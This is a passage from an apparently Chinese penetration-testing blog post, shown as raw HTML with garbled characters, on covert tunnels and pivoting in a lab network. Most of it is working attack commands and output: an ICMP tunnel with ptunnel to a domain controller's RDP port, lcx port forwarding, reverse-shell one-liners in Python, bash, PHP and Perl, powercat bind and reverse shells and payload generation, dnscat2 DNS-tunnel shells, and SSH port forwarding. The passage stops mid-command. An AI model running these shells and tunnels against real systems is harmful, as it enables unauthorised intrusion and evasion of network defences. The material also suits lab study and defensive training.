0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">webæœåŠ¡å™¨</span><br><span class="line">[root@mail ~]# ifconfig</span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:63bf:e247:b694:9bca  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::93f3:83a7:a47f:dda4  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:5d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 7482  bytes 1008757 (985.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3140  bytes 833053 (813.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens34: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.1.1.6  netmask 255.255.255.0  broadcast 10.1.1.255</span><br><span class="line">        inet6 fe80::5577:a12e:72b8:66dd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:67  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 851  bytes 366945 (358.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 509  bytes 68150 (66.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">å†…ç½‘DC</span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP é…ç½®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä»¥å¤ªç½‘é€‚é…å™¨ Ethernet0:</span><br><span class="line"></span><br><span class="line">   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : local</span><br><span class="line">   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::b12d:4163:32df:fa72%4</span><br><span class="line">   IPv4 åœ°å€ . . . . . . . . . . . . : 10.1.1.5</span><br><span class="line">   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 10.1.1.1</span><br></pre></td></tr></table></figure><p><code>é¦–å…ˆwebæœåŠ¡å™¨è¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x pass</span><br></pre></td></tr></table></figure><p><code>kaliè¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.1.11 -lp 6666 -da 10.1.1.5 -dp 3389 -x pass</span><br><span class="line">ä¸Šè¿°å‘½ä»¤å«ä¹‰ï¼šåœ¨è®¿é—®kaliçš„6666ç«¯å£ï¼Œä¼šæŠŠDC 10.1.1.5çš„3389ç«¯å£å°è£…åœ¨ICMPéš§é“é‡Œï¼Œä»¥webæœåŠ¡å™¨192.168.1.11ä¸ºICMPéš§é“è·³æ¿è¿›è¡Œä¼ é€ã€‚</span><br></pre></td></tr></table></figure><p><code>å‚æ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-x    æŒ‡å®šICMPéš§é“è¿æ¥çš„éªŒè¯å¯†ç </span><br><span class="line">-lp æŒ‡å®šæœ¬åœ°ç›‘å¬çš„TCPç«¯å£</span><br><span class="line">-da æŒ‡å®šè¦è½¬å‘çš„ç›®æ ‡æœºå™¨IP</span><br><span class="line">-dp æŒ‡å®šè¦è½¬å‘çš„ç›®æ ‡æœºå™¨TCPç«¯å£</span><br><span class="line">-p  æŒ‡å®šICMPéš§é“å¦ä¸€ç«¯æœºå™¨çš„IP</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desktop 192.168.1.7:6666</span><br><span class="line">desktop 127.0.0.1:6666</span><br><span class="line">windowsçš„mstscç™»å…¥ä¹Ÿå¯ä»¥</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722145522318.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150059749.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150435797.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150519192.png" class><h2 id="0x03-ä¼ è¾“å±‚éš§é“"><a href="#0x03-ä¼ è¾“å±‚éš§é“" class="headerlink" title="0x03.ä¼ è¾“å±‚éš§é“"></a>0x03.ä¼ è¾“å±‚éš§é“</h2><h3 id="1-lcxå†…ç½‘ç«¯å£è½¬å‘"><a href="#1-lcxå†…ç½‘ç«¯å£è½¬å‘" class="headerlink" title="1.lcxå†…ç½‘ç«¯å£è½¬å‘"></a>1.lcxå†…ç½‘ç«¯å£è½¬å‘</h3><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389    # å°†æœ¬æœº3389ç«¯å£è½¬å‘åˆ°hackæœº4444ç«¯å£</span><br></pre></td></tr></table></figure><p><code>hackæœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen  4444 5555    #å°†æœ¬æœº4444ç«¯å£ç›‘å¬çš„æ‰€æœ‰æ•°æ®ä¼ è¾“åˆ°5555ç«¯å£</span><br></pre></td></tr></table></figure><p><code>hackæœºmstsc 127.0.0.1:5555ç™»å…¥</code></p><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184135571.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184150355.png" class><h3 id="2-nc"><a href="#2-nc" class="headerlink" title="2.nc"></a>2.nc</h3><p><code>å‚æ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d åå°æ¨¡å¼</span><br><span class="line">-e ç¨‹åºé‡å®šå‘</span><br><span class="line">-g &lt;ç½‘å…³&gt; è®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªï¼›</span><br><span class="line">-G &lt;æŒ‡å‘å™¨æ•°ç›®&gt; è®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ï¼›</span><br><span class="line">-h åœ¨çº¿å¸®åŠ©ï¼›</span><br><span class="line">-i &lt;å»¶è¿Ÿç§’æ•°&gt; è®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-l ä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç®¡æ§ä¼ å…¥çš„èµ„æ–™ï¼›</span><br><span class="line">-n ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›</span><br><span class="line">-o &lt;è¾“å‡ºæ–‡ä»¶&gt; æŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ï¼›</span><br><span class="line">-p &lt;é€šä¿¡ç«¯å£&gt; è®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-r éšæœºæŒ‡å®šæœ¬åœ°ä¸è¿œç«¯ä¸»æœºçš„é€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-s &lt;æ¥æºä½å€&gt; è®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼›</span><br><span class="line">-u ä½¿ç”¨UDPä¼ è¾“åè®®ï¼›</span><br><span class="line">-v è¯¦ç»†è¾“å‡ºï¼›</span><br><span class="line">-w &lt;è¶…æ—¶ç§’æ•°&gt; è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ï¼›</span><br><span class="line">-z å°†è¾“å…¥è¾“å‡ºå…³æ‰ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ã€‚</span><br></pre></td></tr></table></figure><h3 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a>3.åå¼¹shell</h3><h4 id="01-pythonåå¼¹shell"><a href="#01-pythonåå¼¹shell" class="headerlink" title="01.pythonåå¼¹shell"></a>01.pythonåå¼¹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.1681.11&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="02-bashåå¼¹shell"><a href="#02-bashåå¼¹shell" class="headerlink" title="02.bashåå¼¹shell"></a>02.bashåå¼¹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp 192.168.1.11/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="03-PHPåå¼¹shell"><a href="#03-PHPåå¼¹shell" class="headerlink" title="03.PHPåå¼¹shell"></a>03.PHPåå¼¹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.1.11&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="04-Perlåå¼¹shell"><a href="#04-Perlåå¼¹shell" class="headerlink" title="04.Perlåå¼¹shell"></a>04.Perlåå¼¹shell</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.1.11&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-powercat"><a href="#4-powercat" class="headerlink" title="4.powercat"></a>4.powercat</h3><p><code>Powershellç‰ˆnc</code></p><p><code>å‚æ•°</code></p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td>-l</td><td>ç›‘å¬å…¥ç«™è¿æ¥</td></tr><tr><td>-c</td><td>è¿æ¥ç›®æ ‡</td></tr><tr><td>-p</td><td>è¿æ¥æˆ–ç›‘å¬çš„ç«¯å£</td></tr><tr><td>-e</td><td>è¿”å›æŸä¸ªç¨‹åº</td></tr><tr><td>-ep</td><td>è¿”å›PowerShel</td></tr><tr><td>-r</td><td>ç«¯å£è½¬å‘</td></tr><tr><td>-u</td><td>é€šè¿‡UDPéš§é“ä¼ è¾“æ•°æ®</td></tr><tr><td>-dns</td><td>é€šè¿‡DNSéš§é“ä¼ è¾“æ•°æ®</td></tr><tr><td>-dnsft</td><td>DNSå¤±æ•ˆé˜ˆå€¼</td></tr><tr><td>-t</td><td>è¶…æ—¶é€‰é¡¹ã€‚é»˜è®¤å€¼ï¼š60</td></tr><tr><td>-i</td><td>è¾“å…¥ï¼šæ–‡ä»¶è·¯å¾„ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€å­—èŠ‚æ•°ç»„æˆ–å­—ç¬¦ä¸²</td></tr><tr><td>-o</td><td>æ§åˆ¶å°è¾“å‡ºç±»å‹ï¼šâ€œä¸»æœºâ€ã€â€œå­—èŠ‚â€æˆ–â€œå­—ç¬¦ä¸²â€</td></tr><tr><td>-of</td><td>è¾“å‡ºæ–‡ä»¶è·¯å¾„</td></tr><tr><td>-d</td><td>è¿æ¥åæ–­å¼€</td></tr><tr><td>-rep</td><td>é‡æ–°å¯åŠ¨</td></tr><tr><td>-g</td><td>ç”Ÿæˆæœ‰æ•ˆè½½è·</td></tr><tr><td>-ge</td><td>ç”Ÿæˆç¼–ç åçš„æœ‰æ•ˆè½½è·</td></tr><tr><td>-h</td><td>å¸®åŠ©ä¿¡æ¯</td></tr></tbody></table><h4 id="01-Powercatç”Ÿæˆpayload"><a href="#01-Powercatç”Ÿæˆpayload" class="headerlink" title="01.Powercatç”Ÿæˆpayload"></a>01.Powercatç”Ÿæˆpayload</h4><h5 id="1-æ­£å‘shell"><a href="#1-æ­£å‘shell" class="headerlink" title="1.æ­£å‘shell"></a>1.æ­£å‘shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure><p><code>è¿æ¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -v</span><br></pre></td></tr></table></figure><h5 id="2-åå‘shell"><a href="#2-åå‘shell" class="headerlink" title="2.åå‘shell"></a>2.åå‘shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -e cmd -v -g &gt;&gt; demo.ps1</span><br></pre></td></tr></table></figure><p><code>è¿æ¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure><h4 id="02-powercat-DNSéš§é“"><a href="#02-powercat-DNSéš§é“" class="headerlink" title="02.powercat DNSéš§é“"></a>02.powercat DNSéš§é“</h4><p><code>powercat DNSéš§é“æ˜¯åŸºäºdnscatè®¾è®¡çš„ï¼Œé¦–å…ˆå®‰è£…dnscat</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p><code>kaliæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.1.7 -p 53 -dns ttpowercat.test -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br><span class="line">unnamed 1&gt; </span><br><span class="line">unnamed 1&gt; </span><br><span class="line">C:\Users\Administrator&gt;whoami</span><br><span class="line">unnamed 1&gt; whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><h4 id="03-powercatä½œä¸ºè·³æ¿æœº"><a href="#03-powercatä½œä¸ºè·³æ¿æœº" class="headerlink" title="03.powercatä½œä¸ºè·³æ¿æœº"></a>03.powercatä½œä¸ºè·³æ¿æœº</h4><blockquote><p>ç¯å¢ƒç®€ä»‹ï¼š</p><p>3å°æœºå™¨ã€‚server 2019 èƒ½ä¸win7å’Œkaliäº’é€šï¼Œkaliä¸win7ä¸èƒ½äº’é€šï¼Œserver 2019ä½œä¸ºè·³æ¿æœºä½¿kaliä¸win7äº’é€š</p></blockquote><p><code>win7æ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 9999 -e cmd.exe    #æœ¬åœ°ç›‘å¬9999ç«¯å£</span><br></pre></td></tr></table></figure><p><code>server 2019æ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 8888 -r tcp:10.10.10.20:9999    #æœ¬åœ°ç›‘å¬8888ç«¯å£å¹¶è½¬å‘è‡³10.10.10.20çš„9999ç«¯å£</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc 192.168.1.5 8888 -vv</span><br><span class="line">192.168.1.5: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.1.5] 8888 (?) open</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿æ¥server 2019çš„8888ç«¯å£å°±è½¬å‘åˆ°äº†win7çš„9999ç«¯å£</span></span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨DNSåè®®ï¼Œä¸tcpæ•°æ®æµæ­£å¥½ç›¸å</code></p><p><code>server 2019</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -r dns:192.168.1.7::ttpowercat.test</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>win7</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 9999 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>kaliå¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 6.1.7601]</span><br><span class="line">???????? (c) 2009 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;ipconfig</span><br><span class="line">unnamed 1&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ????</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">???????????? ????????:</span><br><span class="line"></span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line">   ???????? IPv6 ????. . . . . . . . : fe80::f161:9ab3:b020:30f1%11</span><br><span class="line">   IPv4 ???? . . . . . . . . . . . . : 10.10.10.20</span><br><span class="line">   ????????  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   ????????. . . . . . . . . . . . . : 10.10.10.2</span><br><span class="line"></span><br><span class="line">?????????? isatap.&#123;40BE814B-BB9A-4845-AADE-41A6B9E99107&#125;:</span><br><span class="line"></span><br><span class="line">   ????????  . . . . . . . . . . . . : ??????????</span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-åº”ç”¨å±‚éš§é“"><a href="#0x04-åº”ç”¨å±‚éš§é“" class="headerlink" title="0x04.åº”ç”¨å±‚éš§é“"></a>0x04.åº”ç”¨å±‚éš§é“</h2><h3 id="1-sshåè®®"><a href="#1-sshåè®®" class="headerlink" title="1.sshåè®®"></a>1.sshåè®®</h3><p><code>å‚æ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-Cï¼šå‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿç‡ã€‚</span><br><span class="line">-fï¼šå°†SSHä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰çš„shellã€‚</span><br><span class="line">-Nï¼šå»ºç«‹é™é»˜è¿æ¥ï¼ˆçœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰ã€‚</span><br><span class="line">-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚</span><br><span class="line">-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘ã€‚</span><br><span class="line">-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘ã€‚</span><br><span class="line">-Dï¼šåŠ¨æ€è½¬å‘ï¼ˆSOCKSä»£ç†ï¼‰ã€‚</span><br><span class="line">-Pï¼šæŒ‡å®šSSHç«¯å£ã€‚</span><br></pre></td></tr></table></figure><h4 id="01-æœ¬åœ°ç«¯å£è½¬å‘"><a href="#01-æœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="01.æœ¬åœ°ç«¯å£è½¬å‘"></a>01.æœ¬åœ°ç«¯å£è½¬å‘</h4><blockquote><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>kaliå¯ä»¥è®¿é—®å†…ç½‘webæœåŠ¡å™¨(cnetos 7)ï¼Œä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨(win7)ï¼Œcentos 7ä¸win7å¯ä»¥ç›¸äº’è®¿é—®</p></blockquote><p><code>webæœåŠ¡å™¨ä¸ºè·³æ¿ï¼Œå°†win7çš„3389ç«¯å£æ˜ å°„åˆ°kaliçš„3309ç«¯å£ï¼Œè®¿é—®kaliçš„3309ç«¯å£å°±å¯ä»¥è®¿é—®win7dçš„3389</code></p><p><code>kaliæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 3309:10.10.10.20:3389 root@192.168.1.11</span><br><span class="line">ssh -CfNg -L 3309&lt;æœ¬åœ°ç«¯å£&gt;:10.10.10.20:3389&lt;ç›®æ ‡ä¸»æœº&gt; 